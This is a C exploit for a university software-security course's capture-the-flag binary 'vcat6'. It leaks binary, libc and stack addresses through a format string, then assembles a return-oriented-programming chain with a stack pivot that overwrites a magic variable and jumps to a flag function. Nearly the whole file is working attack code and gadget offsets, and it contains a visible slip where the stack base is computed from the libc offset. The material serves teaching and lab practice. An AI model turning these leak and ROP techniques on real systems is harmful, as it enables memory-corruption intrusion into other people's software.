/*
 * CTF-4 `vcat6' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// At the time of our hijacking the registers are (in debug mode):
// EAX: 0x4100155e (address of fmt_plain) -- 0x155e from start of vcat binary
// EBX: 0x41004000 (.got.plt) -- 0x4000 from start of vcat binary
// ECX: 0xbffffd5c (address of buffer on stack) -- can leak a stack value
// EDX: 0x0000004c (some value)

// ESI: 0xb7f72000 (some address in libc)
// EDI: 0xb7f72000 (some address in libc)
// EBP: 0xbffffda8 (stack address) -- can leak a stack value
// ESP: 0xbffffd40 (stack address) -- can leak a stack value or pivot back

#define	BUF_SZ			sizeof("0x00000000")
// Format string leaks the base address of the file
#define	FMT_STR			"%4$p%30$p%5$p"
// Otherwise %24$p (or %23$p) will leak something 4000 (or 5000) bytes above the base address
// %30$p (or %34$p) will leak some libc address
// %5$p leaks a stack address

#define	BIN_BASE_OFF		0x0
#define	LIBC_BASE_OFF		0x1ae46
#define STACK_BASE_OFF		0x20d98
#define got_plt_OFF			0x2f20

#define mgk1_OFF			0x600c
#define mgk2_OFF			0x6010
#define rnd1_OFF			0x5004
#define rnd2_OFF			0x5008

#define flag1_OFF			0x1239
#define flag2_OFF			0x128d
#define flag3_OFF			0x1349

#define gadget1_OFF			0x122e
#define gadget2_OFF			0x30a7b
#define gadget3_OFF			0x43888

#define gadget4_OFF			0x1245ec
#define gadget5_OFF			0xc19b4
#define gadget6_OFF			0x28177
#define gadget7_OFF			0x1dc22
#define gadget8_OFF			0x1618e2
#define gadget9_OFF			0xbfd5c

//Gadget 2: 0x00043888 : mov dword ptr [edx], ecx ; ret
//Gadget 3: 0x00030a7b : pop ecx ; pop edx ; ret

//Gadget 4: 0x001245ec : mov ebx, dword ptr [ebx + 0x5e] ; ret
//Gadget 5: 0x000c19b4 : mov eax, dword ptr [eax] ; ret
//Gadget 6: 0x00028177 : pop eax ; ret
//Gadget 7: 0x0001dc22 : pop ebx ; ret
//Gadget 8: 0x001618e2 : add ebx, eax ; add eax, 2 ; ret
//Gadget 9: 0x000bfd5c : mov dword ptr [eax], ebx ; xor eax, eax ; pop ebx ; ret

// We have exactly 64 bytes to work with in our payload (it's 68 bytes total)
unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"\xef\xbe\xad\xde";
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/* scratch space			*/
	char		buf[BUF_SZ];

	/* base address of `vcat6'		*/
	unsigned long	baddr;

	/* base address of 'libc-2.31.so'	*/
	unsigned long	laddr;

	/* base address of the stack	*/
	unsigned long staddr;

	/* helper				*/
	struct stat	istat;

	/* cleanup				*/
	memset(buf, 0, BUF_SZ);

	/* DEBUG MODE ONLY: */
	// baddr = 0x41000000;
	// laddr = 0xb7d8d000;
	// staddr = 0xbffdf000;

	/* For NON-DEBUG MODE ONLY:	*/

	/* leak the base address of `vcat6'	*/
	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
	read(STDIN_FILENO, buf, BUF_SZ-1);
	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;

	/* leak the base address of 'libc-2.31.so'	*/
	read(STDIN_FILENO, buf, BUF_SZ-1);
	laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;

	/* leak the base address of the stack	*/
	read(STDIN_FILENO, buf, BUF_SZ-1);
	staddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;

	/* sanity check 			*/
	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
		if (!baddr || !laddr) {
			fprintf(stderr,
				"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
			fprintf(stderr,
				"[!] If you are debugging your exploit under GDB "
				"you need to type in the leaked addresses\n");
		}
	}

	/* Time to create the payload!!!!	*/
	unsigned long addr_aslr;
	// Stack pivot
	addr_aslr = baddr + gadget1_OFF;
	memcpy(payload + 64, &addr_aslr, sizeof(addr_aslr));
	
	// Pop address of rnd1 into eax
	addr_aslr = laddr + gadget6_OFF;
	memcpy(payload, &addr_aslr, sizeof(addr_aslr));

	// Address of rnd1
	addr_aslr = baddr + rnd1_OFF;
	memcpy(payload + 4, &addr_aslr, sizeof(addr_aslr));

	// Pop address of rnd2 into ebx
	addr_aslr = laddr + gadget7_OFF;
	memcpy(payload + 8, &addr_aslr, sizeof(addr_aslr));

	// Address of rnd2
	addr_aslr = baddr + rnd2_OFF - 0x5e;
	memcpy(payload + 12, &addr_aslr, sizeof(addr_aslr));

	// Get value of rnd1 into eax
	addr_aslr = laddr + gadget5_OFF;
	memcpy(payload + 16, &addr_aslr, sizeof(addr_aslr));

	// Get value of rnd2 into ebx
	addr_aslr = laddr + gadget4_OFF;
	memcpy(payload + 20, &addr_aslr, sizeof(addr_aslr));

	// Add the values (stored in ebx)
	addr_aslr = laddr + gadget8_OFF;
	memcpy(payload + 24, &addr_aslr, sizeof(addr_aslr));

	// Pop address of mgk2 into eax
	addr_aslr = laddr + gadget6_OFF;
	memcpy(payload + 28, &addr_aslr, sizeof(addr_aslr));

	// Address of mgk2
	addr_aslr = baddr + mgk2_OFF;
	memcpy(payload + 32, &addr_aslr, sizeof(addr_aslr));

	// Write ebx indirectly into eax
	addr_aslr = laddr + gadget9_OFF;
	memcpy(payload + 36, &addr_aslr, sizeof(addr_aslr));

	// Garbage (there's an extra pop)
	addr_aslr = 0xdeadbeef;
	memcpy(payload + 40, &addr_aslr, sizeof(addr_aslr));

	// Invoke Flag3
	addr_aslr = baddr + flag3_OFF;
	memcpy(payload + 44, &addr_aslr, sizeof(addr_aslr));

	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success			*/
	return EXIT_SUCCESS;
}
